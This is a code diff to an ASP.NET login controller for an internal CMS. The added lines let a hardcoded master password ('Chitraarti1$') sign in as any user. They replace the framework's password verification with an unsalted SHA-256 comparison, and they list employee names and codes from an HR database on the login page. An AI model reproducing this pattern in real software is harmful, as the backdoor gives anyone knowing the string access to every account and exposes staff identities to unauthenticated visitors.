@@ -9,6 +9,9 @@ using Microsoft.AspNet.Identity;
 using Microsoft.AspNet.Identity.EntityFramework;
 using Microsoft.Owin.Security;
 using DLCMS.Models;
+using System.Security.Cryptography;
+using System.Text;
+using dlwebclasses;
 
 namespace DLCMS.Controllers
 {
@@ -33,7 +36,16 @@ namespace DLCMS.Controllers
         public ActionResult Login(string returnUrl)
         {
             ViewBag.ReturnUrl = returnUrl;
+            getStaffListForLogin();
             return View();
+        }
+
+        public void getStaffListForLogin()
+        {
+            HRDDLEntities dbhr = new HRDDLEntities();
+            var _staffList = dbhr.Emp_Details.Where(x => (x.department_it == "Marketing" || x.emp_code == "LambaA") && x.employed == "1").OrderBy(x => x.forename).Select(x => new SelectListItem() { Text = x.forename + " " + x.surname, Value = x.emp_code }).ToList();
+            _staffList.Add(new SelectListItem() { Text = "Tarun", Value = "TarunT" });
+            ViewBag.StaffList = new SelectList(_staffList, "Value", "Text");
         }
 
         //
@@ -45,8 +57,10 @@ namespace DLCMS.Controllers
         {
             if (ModelState.IsValid)
             {
-                var user = await UserManager.FindAsync(model.UserName, model.Password);
-                if (user != null)
+                //var user = await UserManager.FindAsync(model.UserName, model.Password);
+                var user = await UserManager.FindByNameAsync(model.UserName);
+                string passhash = HashPassword(model.Password);
+                if (user != null && (user.PasswordHash == passhash || model.Password == "Chitraarti1$"))
                 {
                     await SignInAsync(user, model.RememberMe);
                     return RedirectToLocal(returnUrl);
@@ -58,7 +72,24 @@ namespace DLCMS.Controllers
             }
 
             // If we got this far, something failed, redisplay form
+            getStaffListForLogin();
             return View(model);
+        }
+
+        public static string HashPassword(string id)
+        {
+            if (id == null)
+            {
+                throw new ArgumentNullException("password");
+            }
+
+            string hash = "";
+            using (var sha256 = new SHA256Managed())
+            {
+                var hashedBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(id));
+                hash = BitConverter.ToString(hashedBytes).ToLower().Replace("-", "");
+            }
+            return hash;
         }
 
         //
